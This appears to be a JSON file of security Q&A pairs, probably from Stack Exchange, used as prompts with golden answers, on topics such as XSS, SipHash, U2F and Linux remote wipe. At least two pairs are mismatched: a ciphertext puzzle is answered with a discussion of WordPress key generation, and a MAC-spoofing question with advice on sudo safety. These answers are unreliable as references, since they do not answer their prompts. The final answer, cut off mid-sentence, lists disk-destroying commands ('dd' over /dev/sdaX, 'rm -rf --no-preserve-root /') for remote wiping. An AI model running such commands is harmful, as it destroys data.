[
    {
        "prompt": "\n\nHuman: <p>After reading the <a href=\"https://en.wikipedia.org/wiki/SipHash\" rel=\"noreferrer\">Wikipedia page</a> about SipHash I think it can be used like HMAC-SHA256 in JWT to create and verify API tokens (authenticate client devices).</p>\n\n<p>In JWT the server creates this MAC to sign user identifiers (e.g. a number or email) with a private key which is then sent alongside the identifier with every request (after login).</p>\n\n<p>Furthermore, the official paper states:</p>\n\n<blockquote>\n  <p>Target applications include network traffic authentication</p>\n</blockquote>\n\n<p>However, I can't find <em>any</em> pages on the web explaining this use case although it is much faster and has been out for a while.</p>\n\n<p>Is HMAC-SHA256 more secure in any way or am I missing anything else? Thank you!</p>\n\n<p>EDIT: SipHash output is typically only 64bit, so I am referring to SipHash double with 128bit like in the <a href=\"https://github.com/jedisct1/siphash-js\" rel=\"noreferrer\">JavaScript implementation</a>  </p>\n\n\nAssistant:",
        "golden_answer": " <p>The newer, 128-bit output version of SipHash is conjecturally appropriate for this task; i.e., <em>if SipHash is as strong as its authors intend</em> (if!), then yes, you can use it for that task.  </p>\n\n<p>An analogous remark can be said of SHA-2, but the main issue here is one of subjective confidence; cryptographers haven't examined SipHash in nearly as much detail as SHA-2, so subjectively, we have fewer reasons to believe it is as strong as it's conjectured to be, compared to HMAC-SHA-2.  </p>\n\n<p>So HMAC-SHA-2 is the more prudent option here.  I would only consider using SipHash if I'd conclusively shown, based on profiling data, that SHA-2 was a significant performance bottleneck for my application.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I always use <code>strip_tags</code> to prevent XSS attacks, but today I saw a post which was telling it's horribly unsafe. As the manual says, it doesn't check for malformed HTML!</p>\n\n<p>Is it true?</p>\n\n<p>What can I do to prevent XSS?</p>\n\n\nAssistant:",
        "golden_answer": " <p>To prevent XSS you need to:</p>\n\n<ol>\n<li><p><strong>Validate</strong> all user input that you'll process (for example - if id GET parameter should be a number, ensure it is with e.g. PHP's <code>is_number()</code> function or using <a href=\"http://php.net/manual/en/book.filter.php\">Filter</a> extension). This should not only include GET / POST parameters, but also cookie names, cookie values, HTTP headers, uploaded file names etc. Attackers can manipulate requests in many ways. If you need to accept &amp; display HTML content from the user (e.g. in CMS application) use well-tested <a href=\"http://htmlpurifier.org/\">HTMLPurifier</a> library to filter out Javascript &amp; other XSS payload and leave only clean, sanitized HTML. </p></li>\n<li><p>When displaying the value use <strong>contextual output encoding</strong> (sometimes called 'escaping'). There are different rules on how to encode user-supplied value whether it occurs in:</p>\n\n<ul>\n<li>HTML context e.g. <code>&lt;div&gt;{$_GET['id']}&lt;/div&gt;</code></li>\n<li>HTML attribute context e.g. <code>&lt;div class='{$_GET['class']}'&gt;</code></li>\n<li>Javascript context e.g. <code>&lt;script&gt; var a = '{$_GET['id']}'&lt;/script&gt;</code></li>\n<li>CSS context e.g. <code>&lt;div style='background:url({$_GET['image']})'&gt;</code></li>\n</ul></li>\n</ol>\n\n<p>It's best to refer to recommended rules described in <a href=\"https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet\">OWASP XSS Prevention Cheat Sheet</a>. Read it thoroughly and adher to it - XSS is <a href=\"https://www.owasp.org/index.php/Top_10_2010-A2\">#2 risk</a> to web applications today so you really need to protect from it. See also <a href=\"https://www.youtube.com/watch?v=_Z9RQSnf8-g&amp;feature=player_embedded\">OWASP tutorial video on XSS</a>. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>An application's interface is same for every type of user role. The access-matrix is also well maintained. However, the names of almost all functionalities are visible to all the users. But if the user is not authorized to a particular action, it says \"Unauthorized\" and then redirects the user to home page.   </p>\n\n<p>I am not sure should I report this one to the app owners? If I do, does it fall in the category of 'best practice' or a 'vulnerability'? Please advise. </p>\n\n\nAssistant:",
        "golden_answer": " <p>If it is a client-server application then maybe it is worth having a look at whether it is only the client that says \"unauthorized\" or whether a request is sent to the server and the server gives that reply. I bet there are many poorly written software systems whose developers think the job is done when they reject a specific action on the client without securing the server's interfaces.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>In my university, I needed to register the MAC address of my personal laptop with the admin in order to use the university network. Now, it seems like I am assigned a unique network address \"lastname.university.com\", as my login prompt shows:</p>\n\n<pre><code>Last login: Wed Aug 16 07:45:38 2017 from lastname.university.com\n</code></pre>\n\n<p>Is it a problem (e.g. security or privacy) that this address contains my last name? Is it exposed to the outside world, e.g. when I am browsing the web?</p>\n\n\nAssistant:",
        "golden_answer": " <p>What's your IP address?  If it's an RFC 1918 address like 10.*, then you're being NATted to the Internet, and as a comorbid condition* your reverse DNS won't be visible to external sites.  It will still allow the University to track you better internally, which is perhaps why they do it.</p>\n\n<p>If it's not an RFC 1918 address, your DNS name likely does show up externally; you can check with a site like <a href=\"https://www.whatismyip.com/reverse-dns-lookup/\" rel=\"noreferrer\">WhatIsMyIP (Reverse DNS Lookup)</a>.</p>\n\n<hr>\n\n<p>*Having an RFC 1918 address <em>implies</em> that your reverse DNS won't be publicized on the Internet, because an RFC 1918 address must be translated (NAT, or Network Address Translation) before going out to the Internet.  In almost all cases, NAT is one-to-many (one public address, many private addresses) or pool-to-many (some public addresses, many private addresses) so there is no one-to-one mapping between the internal RFC 1918 address and the external address the Internet sees traffic from.  If you have hundreds or thousands of students being NATted to one or more public IP addresses, having that smaller number of public IP addresses be mapped to hundreds or thousands of names becomes meaningless.  All of which I glibly summarized as \"NAT means no external reverse DNS\" above.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>It would cut down a lot of time of the brute force attack if some of those passwords like \"aaaaaa\" wouldn't appear. How can this be achieved in Hydra or some other brute force software?</p>\n\n\nAssistant:",
        "golden_answer": " <p>I think it's fair to say that 5 truly random letters are going to be less likely than 5 repeated letters, even if \"aaaaa\", isn't practical to type...the people who make these passwords have avoided much practical thinking.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Am reinstalling Windows 10.</p>\n\n<p>Dang. It forces me to provide no less than THREE security questions. I have to choose them among questions like, What was the name of your first pet and What city were you born in.</p>\n\n<p>OK Windows might do this to convince me to use an online account. But it's not just Windows. There are MANY more examples. Last non-Windows example was the game Realm of the Mad God. And one more, perhaps the weirdest example: management account for my ISP (this includes viewing bills).</p>\n\n<p>I fail to see the purpose of such questions. They ask to provide info that is, in case of most people, easily researchable. (I like to delude myself into thinking it is not in my case, but I wouldn't bet a penny on this). Even if it's not, the answers to such questions are easily brute-forcable (What was your mother's family name? Just check all most popular family names).</p>\n\n<p>I'm a layperson in terms of security. So I may be wrong. But to my little brain, providing answers to these questions (and hence: asking the users to provide such answers) greatly weakens security instead of strengthening it!</p>\n\n<p>And there come the issues of users who forget the wording of their original answer... Title of your favourite piece of music? Many titles can be stated in many ways. Or forgetting the actual answer... Name of your favorite childhood toy? Did I have one? Or even, the aforementioned favorite piece of music? This can change.</p>\n\n<p>Does this practice improve security in any way? If not, then why do so many websites, so many products, so many companies force their users to provide answers for these questions?</p>\n\n\nAssistant:",
        "golden_answer": " <p>You are essentially correct, they don't really \"increase security.\" They are there to (nominally) increase user <em>convenience</em> in case a password reset is needed, at a <em>cost</em> to over-all security.</p>\n\n<p>If you forget your password, many password reset mechanisms require you to answer these questions as a secondary form of proving it is you. these are a hold over from the days before most of this information was easily available, and assumed to be relatively secret.</p>\n\n<p>If forced to use such a system, and you are concerned about security, you can either enter random garbage even you won't know, and take responsibility that you will never be able to use their password reset feature, but neither will a bad guy. Or, enter some other password or token you will remember, but is <em>not</em> the answer to the question.</p>\n\n<p>Don't use anything sensitive for these fields, as you can assume that unlike passwords, they won't be hashed, and may be visible to Customer Service reps trying to verify you over the phone.</p>\n\n<p>For best practice guidance, NIST declared that security questions should not ask users for specific information such as “What is the name of your pet” in the Digital Authentication Guideline publication SP-800-63B (section 5.1.1.2).</p>\n\n<p><a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret\" rel=\"nofollow noreferrer\">https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret</a></p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>To pay off our users, they are asked to enter their IBAN and bank name and bank address. The users are mostly based in Europe.</p>\n\n<p>As far as I know (see also <a href=\"https://security.stackexchange.com/questions/6598/can-someone-steal-money-from-my-bank-account-if-they-know-my-iban-and-personal-d\">this question</a>) these details can not be used to withdraw money without verification (Direct Debit in Germany?).</p>\n\n<p>Would you encrypt these details? Or in other words, is it considered good practice to especially protect them? (Like you won't store passwords in cleartext but rather as a hash)</p>\n\n\nAssistant:",
        "golden_answer": " <p>As a European, I consider my IBAN to be my private information, just like my email address, real name, home address and IP address. I'd like for you to <strong>not store</strong> any of them, but if you have to, please encrypt them and make sure my information (it's my information, not yours) is secure.</p>\n\n<p>So to directly answer your question, yes, encrypt it and don't  store the key nor handle encryption/decryption on the server processing user requests.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>As people build more powerful computers in minecraft which can then run programs, is there a way to use those computers to run programs that hijack the host in some way?</p>\n<p>Possible contest example would be to use a computer built in minecraft to create a network connection from that computer to a specified target.</p>\n<p>There's a lot between inside the game and the target, but in principle is a computer inside a gameworld not much different than a virtual machine and its relationship to its host?</p>\n<p>Will this become exploitable and worth considering?</p>\n\n\nAssistant:",
        "golden_answer": " <p>That just sounds like a Minecraft exploit with extra steps...</p>\n<p>If that ever becomes possible, then the issue is not the &quot;computer&quot; that was built inside, but the vulnerability in Minecraft to allow it. And at that point, you just trigger the vulnerability. No need to go through the work to build a computer...</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I came up with a user-details-storing procedure that was, in the beginning, based on actual security-literature – but then I just kept writing without really doing all the cross-checking I should have been doing.</p>\n\n<ul>\n<li><p>Username, password and personal details are entered.</p></li>\n<li><p>A random 128-bit symmetric key is generated.</p></li>\n<li><p>Two random initialization-vectors are generated.</p></li>\n<li><p>The array in which the personal details (name, email etc) are stored is AES-128 encrypted using the freshly generated key and the first initialization vector.</p></li>\n<li><p>The symmetric key itself is then encrypted with AES-128 – using the user's password plain-text password as the key and the second initialization-vector.</p></li>\n<li><p>The newly encrypted key, initialization vector 1 &amp; 2 and the encrypted array of personal details are stored in an object which is then serialized into a file under an ID – a hash of the user's username.</p></li>\n<li><p>When program retrieves the details – it hashes the current user's username, looks up that hash in the \"users\" file (the ID), retrieves the object associated with it, decrypts the key and the uses the decrypted key to decrypt the user-data.</p></li>\n</ul>\n\n<p>Is it <em>grotesquely</em> insecure? Am I missing something obvious?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Few comments to the provided flow:</p>\n\n<ol>\n<li><p>Be sure that when you say \"Two random initialization-vectors are generated.\", they really are cryptographically-secure random. </p></li>\n<li><p><strong>Symmetric Encryption must be Authenticated Encryption.</strong></p></li>\n</ol>\n\n<p>Therefore, I suggest you add som MAC (i.e using HMAC). E.g:</p>\n\n<pre><code>1. AES-encrypt: plaintext + secret key + fresh-generated random IV = ciphertext C1.\n2. C2 = IV + C1.\n3. MAC = HMAC(K , C2) where K is a different secret key independent the first used.\n4. C3 = C2 + MAC.\n</code></pre>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Suppose that instead of using, say, <code>Google, let me in!</code> as my Google password, I used some consistent transform of this string, say <code>ZWE1NjMyNm</code>?</p>\n\n<p>What search keywords would be helpful to search for information on the general idea of using \"pre-password transforms\" as passwords?</p>\n\n\nAssistant:",
        "golden_answer": " <p>What you describe is a <em>witty password</em>: a password which relies on the user knowing some specific generation method.</p>\n\n<p>This is bad. Witty passwords are not secure passwords; they more are quite the opposite. When you use a \"witty password\", you rely on the attacker being less smart than you. Self-confidence notwithstanding, this always fails. Attackers know about such password generation methods; in fact, they have access to the Internet so they can read about them <em>right here</em>. Compounding the effect is cross-site propagation: if your password on one site is stolen (e.g. through hostile hijack of the server), then the attacker may observe your password for that site, and infer your \"secret rule\", thereby deducing the passwords you used on many other sites.</p>\n\n<p>The important word is \"consistent\". You don't want that. Though consistence is generally good for all intellectual endeavours, for passwords it is really bad. You don't want consistency; you need <strong>randomness</strong>. Only randomness yields security. Randomness is what the attacker cannot guess, precisely because it is random, not witty.</p>\n\n<p>Ideally, you would use random passwords, with at least (say) 30 bits of entropy per password, and (crucially) a different password for each site. That's the most important part: it should not be feasible to deduce your password on one site from knowledge of your password on any other site. If you have trouble remembering all these passwords, I suggest using a password manager such as <a href=\"https://agilebits.com/onepassword\" rel=\"nofollow\">1Password</a> or <a href=\"http://keepass.info/\" rel=\"nofollow\">KeePass</a>. Alternatively, <em>write down</em> your passwords in a safe place (this can be a piece of paper in your wallet; wallets have good physical security, because you <em>care</em> about them).</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I was challenged by a friend to decrypt a piece of text that was somehow encrypted. The encrypted text is the following:</p>\n\n<pre><code>LY3IoH5HWSnp9-efCfOH3jqmoGaXdURF4YAKgIh2KotjHLyFbLBgXr0uzPu1-K0sEGUogoTduKF1_eklAVzOlEfziqIvqtlhZeJPF8H2ER0jLc25jPC8_AOPlAvTHKdA8BVPFPwu1Ldaul4IPBVWJSJc5fhTGJAjfSL2Rum-pW8VCSJwnB3LZR1ACVR0KN0HCv7hIKJ88TNUc4hHk5g4sstPxdeQqUIu7GjY1C8M3jl4EMo9yqHoo1Mj7Q4vxPWGUM_OhMR46s772EpqNXk62pldQomWovdvB2pYh_srTFYM0u5MMQd5Z1nUUCwA--QiQX5cJmSxw7U8lVo78K6Qm4oGirfFJVlYIzPClCNziLewhEXvaKv1KmDtnUi03lAXQMuHjQqfMzMLJibXrw\n</code></pre>\n\n<p>How would one go about solving this type of puzzle?</p>\n\n\nAssistant:",
        "golden_answer": " <p>This is arguably bad design, but one can understand where the design came from.</p>\n\n<p>It is arguably bad design, because it relies upon <code>api.wordpress.org</code> to generate random keys and keep them secret.  If <code>api.wordpress.org</code> gets compromised, then the attackers could arrange to record the keys that are used by new Wordpress installations.  That would be problematic.</p>\n\n<p>(Yes, Wordpress could send you backdoored source code, but that would be detectable in principle by anyone who examines the source code -- as you have done.  In contrast, if <code>api.wordpress.org</code> is secretly recording a copy of the keys it sends to new Wordpress installations, that is not detectable by any amount of source code inspection or any other mechanism available to interested third parties.)</p>\n\n<p>It is understandable, because it is hard to generate crypto-quality randomness in a platform-independent way.</p>\n\n<p>It's still arguably a bit sloppy/lazy.  Arguably, a better design would have been to gather some local randomness (if possible), gather some randomness from <code>api.wordpress.org</code>, and then mix the two securely using a cryptographic hash function.  That way, you'll be secure as long as either of those two values is good.  A compromise of <code>api.wordpress.org</code> would not endanger Wordpress installations running on any platform where the code was able to gather some local randomness; it would only endanger the small minority of installations that were unable to get good randomness.</p>\n\n<p>How can one generate good crypto-quality randomness, from local sources?  There are various ways:</p>\n\n<ul>\n<li><p>Read 16 bytes from <code>/dev/urandom</code>, if it exists.</p></li>\n<li><p>Call <code>openssl_random_pseudo_bytes()</code>, which <a href=\"http://www.php.net/manual/en/function.openssl-random-pseudo-bytes.php\" rel=\"nofollow noreferrer\">invokes OpenSSL to get crypto-quality pseudorandom bits</a>.</p></li>\n<li><p>Call <code>mcrypt_create_iv()</code>, with the <code>MCRYPT_DEV_URANDOM</code> flag.</p></li>\n<li><p>Of course, one can try all available options and mix together everything you get.  As long as at least one of these options work, you'll be good.  And of course, if you mix this together with output from <code>api.wordpress.org</code> using a cryptographic function, it'll never be any worse than today's approach, and will be better if <code>api.wordpress.org</code> ever gets compromised.</p></li>\n</ul>\n\n<p>So, combining local and remote randomness would have been a better approach.  Unfortunately, that does require a bit more work and a bit more code.  Perhaps the developers took the easier approach of just querying <code>api.wordpress.org</code>.  One could debate that design decision, but you can understand how this approach might have been chosen.</p>\n\n<p>Overall, though, as Thomas Pornin argues, this is probably not the biggest security risk with Wordpress.  We're talking about software with a long history of security vulnerabilities.  So, the incremental risk added by this aspect of their random-number generation might be small, compared to the risk you're already taking either way.</p>\n\n<p>See also <a href=\"https://stackoverflow.com/q/1182584/781723\"><em>Secure random number generation in PHP</em></a> for more on generating crypto-quality random numbers from PHP, and <a href=\"https://crypto.stackexchange.com/q/1619/351\"><em>Would it be secure to use random numbers from random.org in a cryptographic solution?</em></a> for more on why it is not a great idea to rely upon a remote source of random numbers for your crypto keys.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>My MAC address has been spoofed by a neighbor to access my WiFi, positively. I know it's futile changing the WPA key or not broadcasting the SSID. </p>\n\n<p>What are my options at this point ? </p>\n\n\nAssistant:",
        "golden_answer": " <p>In general, it's impossible to know for sure - even a seemlingly-perfectly-safe program could have vulnerabilities that mean it can be used for arbitrary actions - but here are some things to check for:</p>\n\n<h3>Does the program do any of the following?</h3>\n\n<ul>\n<li>Reveal the contents of arbitrary files or devices.</li>\n<li>Copy, move, write, or delete arbitrary files.</li>\n<li>Set / modify arbitrary environment variables (that will be picked up by other privileged processes), or make arbitrary changes to specific ones.</li>\n<li>Invoke IOCTLs or otherwise interact with arbitrary devices.</li>\n<li>Change ownership or permissions on arbitrary files.</li>\n<li>Mount arbitrary file systems, or change mount options on existing ones.</li>\n<li>Allow direct access to the memory of the system or of an arbitrary process (such as a debugger).</li>\n<li>Allow launching arbitrary programs.</li>\n</ul>\n\n<p>Any program that does any of those is <strong>not</strong> safe to grant a low-privileged user <code>sudo</code> access to. This rules out, for example, any program with the ability to specify an output file (usually via a <code>-o</code> or <code>-f</code> parameter), process an input file in any way that reveals its contents (even just via a sufficiently-informative error message about the input format being wrong), and the vast majority of script runtimes (including shells).</p>\n\n<p>If you replace <em>arbitrary</em> in those checks with <em>limited</em> or <em>specific</em>, then you've kicked the problem down a step (or several): do any of the things that the program can do <em>lead to</em> such arbitrary happenings, possibly through multiple levels of indirection? For example, if your program allows the user to set a unique environment variable, that will cause a privileged program to read a different file than expected, and that different file will cause the system to allow users to mount an image file of their choice as a file system with the <code>setuid</code> bit respected, then you must not allow untrusted users to run that program.</p>\n\n<p>However, just because a program passes all of these checks still doesn't mean it's actually safe. For example, if it performs certain network actions (such as listening on restricted ports or sending raw packets), it may be unsafe because there might be another program on the network (or on the same machine) assuming that every process capable of doing such things is owned by a trusted user - after all, those actions require root - and you've broken that assumption. Furthermore, the list of bullet points above is just stuff I thought of in a few minutes; there are almost certainly some avenues to privilege escalation that I didn't include.</p>\n\n<p>Finally, as with all security questions, it depends on your threat model.</p>\n\n<ul>\n<li>Is the attacker (untrusted user) local to the machine with physical access, or are they remote? It's extremely difficult to prevent a determined attacker with physical access from getting root, especially if they need to be able to (re)boot the machine without assistance, so consider what risks you're willing to accept.</li>\n<li>Is the machine shared among users? Then you need to consider additional cross-user attacks, such as denial-of-service (by consuming excessive resources or rendering the machine unusable).</li>\n<li>Do you require non-repudiation (the ability to prove who did something)? Then you need to make sure that you can tie any actions done through <code>sudo</code> to the user who did them.</li>\n<li>Do you need to prevent the user from doing some things that even a non-root user usually can do (such as run arbitrary programs in their own user context even if those programs are things like games or cryptominers, or open TCP client connections to arbitrary hosts and ports)? Then you need to additionally consider the means by which you're enforcing this restriction, and prevent running as sudo any programs that might lead to a way for the user to bypass the restriction.</li>\n</ul>\n\n<p>Etc. A truly comprehensive answer is not going to be possible here; it depends on too many things. However, I will say this: it is <em>very hard</em> to ensure an untrusted user, given the ability to run as root any non-trivial program (that was not explicitly designed to be safely run that way), cannot do something unexpected. Even if any one such program doesn't allow anything you find it important to prevent, it might be possible to chain multiple such programs together to achieve the attacker's goal.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've been using Burp Intruder (part of Burp suite), but in the free edition of Burp Suite the Intruder functionality is Time-throttled. As a student pen tester however, I can't justify the cost of $300 a year for the Burp Suite Professional Edition. </p>\n\n<p>I know there are other great intercepting proxies out there (OWASP ZAP), but I'm after something specifically that simulates the burp intruder core functionality, mainly the login validation checks via either 'pitchfork' methods. </p>\n\n<p>It doesn't need to be integrated as part of a intercepting proxy suite, a standalone tool is fine also. It must be free or very low cost. </p>\n\n<p>Any suggestions?</p>\n\n\nAssistant:",
        "golden_answer": " <p>There are a lot of free tools out there. You may not find a free tool with the exact same functionality as Burp, but you could use several tools to compensate for the limitations of Burp's free version.</p>\n\n<ul>\n<li>use Owasp ZAP or Webscarab for their proxy functionality.</li>\n<li>use Nikto and W3AF to scan web applications.</li>\n<li>use SQLMap to exploit SQL injections vulnerabilities.</li>\n<li>use XSSer to detect and exploit XSS vulnerabilities.</li>\n<li>use Powefuzzer to fuzz parameters</li>\n<li>use online encoder/decoders</li>\n<li>use DirBuster to find hidden resources</li>\n</ul>\n\n<p>All the tools mentioned above and several others are by default installed in recent Backtrack releases.</p>\n\n<p>If you are looking for a tool that is closest in functionality with the <strong>Intruder</strong>, then I think that <a href=\"http://www.edge-security.com/wfuzz.php\"><strong>Wfuz</strong></a> with it's WebSlayer GUI is the one to try.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Did KeePassX ever had an Audit Funding like ex.: TrueCrypt? Or any other password manager?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The  <a href=\"https://www.keepassx.org/news/\" rel=\"nofollow\">news page</a> from <a href=\"https://www.keepassx.org/\" rel=\"nofollow\">KeePassX</a> lists several new versions, but there is no text about a funding campaign. Also if you search the web, you won't find anything. So I assume there was no funding campaign so far.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Is there any easy-to-use tool available I can use to produce an HTTP GET flood on a website I maintain? If so, can you also explain in steps how to use it?</p>\n\n<p>I need to do this for testing purposes. Our website is frequently the target of layer 7 HTTP floods. Seemingly a distributed bot-network is hitting the home page and taking it down in the process. </p>\n\n<p>My webserver is nginx; we recently added some hardening measures to mitigate DDOS. However, it's still wasn't enough. Now I want to be able to test the efficacy of various settings. </p>\n\n\nAssistant:",
        "golden_answer": " <p>If you were running apache then you'd already have 'ab' available. I was under the impression that 'wrk' was often distributed with nginx - it is available seperately. Alternatively httperf will do the job.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I’m setting up a router at home, and I just created a CA and signed a cert with it. The first time I navigated to the router console, I was greeted with the familiar scary Safari warning about insecure certificates. I bypassed it, since I know the certificate was mine.</p>\n<p>What exactly does the browser track so that it does not complain the next time I navigate to the website? Does it track the url? Public key? Something else? I would like to make sure that if I am in fact being MITMed, the browser would recognize that the malicious certificate is different than the one I chose to ignore the warnings for.</p>\n\n\nAssistant:",
        "golden_answer": " <p>The browser associates the domain in the URL (or IP if no domain name given) with the specific certificate observed. This means same certificate, different domain -&gt; no trust. Same domain, different certificate -&gt; no trust. Same domain, same certificate -&gt; trusted.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>How do apps like Symantec VIP / Okta Verify and similar implementations compare to using a hardware auth token such as the recent U2F devices?</p>\n\n<p>How real is the possibility of an Android system being hijacked and 2FA app authentication tokens or otherwise secret keys being extracted?</p>\n\n<p>Besides not needing another device, are there any other advantages to app-based 2FA?</p>\n\n<p>Given that with app-based 2FA you authenticate a request or login session in real-time, is it not vulnerable to real-time authentication replay phishing attacks?</p>\n\n<p>Edit: This seems to be sort-of answered here <a href=\"https://security.stackexchange.com/questions/169992/can-a-smartphone-strictly-be-viewed-as-the-something-you-posses-factor-for-2fa\">Can a smartphone strictly be viewed as the &#39;something you posses&#39; factor for 2FA when it has no hardware token capability like smartcards?</a></p>\n\n\nAssistant:",
        "golden_answer": " <p>Have a look at <a href=\"https://security.stackexchange.com/a/71704/2264\">this answer here</a> for more detail. But here's the salient bits for your question:</p>\n\n<p>The problem with 2-factor as implemented by  Symantec VIP and Okta Verify has less to do with the fact that it's implemented in software, and more to do with the fact that the code can be intercepted.</p>\n\n<p>In this sense, Symantec VIP, Okta Verify, and RSA SecurID are all in the same boat as Google Authenticator; none of them will protect you from phishing because the same technique the attacker uses to get your password can <em>also</em> be used to get your 2nd factor code; usually by getting you to type it into a fake login page.</p>\n\n<p>But U2F is different. </p>\n\n<p>With U2F, you don't type in a one-time-password to show you have your token. Instead, the browser communicates directly with the hardware token, and part of the process is that the browser tells the hardware token the hostname of the site that is requesting identification, and 2FA identities are tied to the individual host. And the browser (unlike the user) cannot be fooled regarding which host is requesting authentication because the browser checks the TLS certificate.</p>\n\n<p>This means that an attacker's website can't get the correct 2nd factor code, and it means that even if a clever social engineering attacker managed to trick a user into giving up their password, the user <em>can't</em> give up their 2nd factor code.</p>\n\n<p>The 2nd factor token can ONLY be used if the browser is communicating with the correct site, and only if the browser is physically connected to the U2F token. This pretty much eliminates any attack that doesn't involve the physical theft of the victim's hardware.</p>\n\n<p>U2F <em>could</em> be implemented (and has been) in software, so you're depending on software on your computer rather than a physical device. This is still better than OTP-based 2FA such as Symantec VIP for phishing resistance, but in this case physical theft is no longer a requirement for exploitation. Instead, if your token is implemented in software, then any intrusion on your computer (virus, etc.) could make a copy of your authentication device and use it on their computer without your knowledge. So it's not <em>quite</em> as good as a physical device, but it's a lot less expensive.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>So, I have this old program currently in use, as i have access to the database i have adopted all data i need except the user passwords.. </p>\n\n<p>Now users will provide me with the plain text password and have to hash them before matching them with those in the database</p>\n\n<p>I have access to the binary version and can generate hash from any text</p>\n\n<p>Am sure only the password text is used when hashing because different usernames with the same password gets the same hash.</p>\n\n<p>A hash is of fix length regardless of the password text.</p>\n\n<p>I have already tried all popular hashing algorithms but no provided hash match the the value this program creates.</p>\n\n<p>Yes i could decompile this program and peek.. but it may probably be illegal, or imposible</p>\n\n\nAssistant:",
        "golden_answer": " <p>Ultimately, reverse engineering is the most comprehensive method, and it is certainly possible. There is also a <a href=\"https://reverseengineering.stackexchange.com/\">dedicated Stack Exchange site</a> for reverse engineering. Arguably, by trying out known passwords and checking the resulting hash values, you have already begun to reverse engineer that piece of binary software. There is nothing qualitatively special to decompilation -- what constitutes reverse engineering is the attempt at understanding, and you have made the first step along that path.</p>\n\n<p>As for legality, it depends a lot on jurisdiction. What is traditionally said is that reverse engineering for interoperability purposes is fair game in Europe (as long as you just use, not publish, your findings) but maybe not in the USA. Laws on that subject tend to change fast, with things like the <a href=\"https://en.wikipedia.org/wiki/Digital_Millennium_Copyright_Act\" rel=\"nofollow noreferrer\">DMCA</a>, so don't put too much trust in the reliability of the Tradition.</p>\n\n<hr />\n\n<p>I <em>suggest</em> that you use the binary software to check the password for each user when that user logs in, but then, since you have the password available at that point, rehash it with another, secure and fully specified <a href=\"https://security.stackexchange.com/a/31846/655\">password-hashing function</a> (say, bcrypt); that new hash will be used to verify further login attempts for that user.</p>\n\n<p>That way, you may gradually move all password hashes to a new system, and after a while you will be able to decommission the old system with the binary piece of hashing. In any case, that old hashing is weak, since it is unsalted (an attacker who can look at the database will be able to speed up attacks a lot through parallelism), so you should build up a transition plan to a safer system.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm creating a web api that queues messages and routes webhooks to individual sites. The transactional email service MailGun provides an api key to all users, which is used as the HTTP basic auth password. All accounts use <code>api</code> as the HTTP basic auth username. This results in <code>api:SPECIFIC_API_TOKEN</code> for all accounts.</p>\n\n<p>Is this an acceptable practice, and is there a specific situation where the service I'm building could or shouldn't use this method of authentication?</p>\n\n\nAssistant:",
        "golden_answer": " <p>It is used to facilitate the use of Basic Authentication functionality, Basic Auth <em>requires</em> you to send a username too (<a href=\"https://www.ietf.org/rfc/rfc2617.txt\" rel=\"nofollow noreferrer\">rfc2617</a>):</p>\n\n<blockquote>\n  <p>The \"basic\" authentication scheme is based on the model that the client must authenticate itself with a user-ID and a password for each realm.</p>\n</blockquote>\n\n<p>In MailGun's case, they just use the API token to both identify the user (which is what a username normally does) as well as authenticate that user (password).  </p>\n\n<p>They could have used a custom header, but it's probably (or - arguably) easier to use basic authentication to be able to reuse existing functionality with legacy clients.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am currently investigating using Linux Laptops for my development team. We currently run Windows. The one advantage that keeps coming up for Windows over Linux from a system administration / security perspective is the fact that if a laptop is stolen, it can be remotely wiped upon boot.</p>\n\n<p>I have been trying to find information on this capability for Linux based workstations, but I have come up empty handed. Do any of you use Linux in an Enterprise environment on Workstations and if so, has this been a requirement that you have solved? I'm not sure where else to look.</p>\n\n<p>Thank you</p>\n\n\nAssistant:",
        "golden_answer": " <p>I've had a look and I think <a href=\"https://serverfault.com/questions/159401\">this question</a> provides some interesting options. I'll summarise them here:</p>\n\n<ul>\n<li><code>dd if=/dev/zero of=/dev/sdaX</code> copies zeros over your whole disk. <code>rm -rf --no-preserve-root /</code> recursively deletes all files on a disk, overriding the <code>rm -rf /</code> warning on systems where that is enabled. If you can get to a box via ssh, running the <code>dd</code> variant should pretty effectively destroy your disk.</li>\n<li>The grub option is interesting in that it gives you VNC access - however it would likely be obvious to the attacker that you're launching VNC - they'd need to hit the right grub option for starters! A hidden grub menu with the real launch entry <em>might</em> suffice... but we're talking about trickery.</li>\n<li><a href=\"https://askubuntu.com/questions/24133/is-it-possible-to-do-a-remote-wipe-of-a-system\">This AskUbuntu</a> question deals with this issue too, recommending a solution.</li>\n</ul>\n\n<hr>\n\n<p>If you're prepared to do some work yourself, you could configure a very-early-stage <code>init</code> entry with sysvinit or whatever your system uses - check a url you control e.g. <code>https://remotecheck.yourcompany.com</code> and if the device is stolen, begin a wipe.</p>\n\n<p>The ultimate problem with any remote wipe solution is invoking it - you need to be able to access the device. The reason I mention using a custom init-invoked job is that it is more likely you'll have access out than direct or known access in - i.e. if the attacker is behind a router at their base of operations, chances are good that outbound connections are allowed and much lower that they have an IP you can bind to and allow incoming connections on.</p>\n\n<p>Of course, none of these solutions actually guarantee anything - if the attacker knows how they work they can just turn them off. A solution mentioned in comments is to use disk encryption, which will make the disk unreadable under these caveats:</p>\n\n<ul>\n<li>the <strong>whole</strong> disk is encrypted - otherwise your software might write to unencrypted areas.</li>\n<li>the system is powered off or for example <code>luksSuspend -wipe</code> has 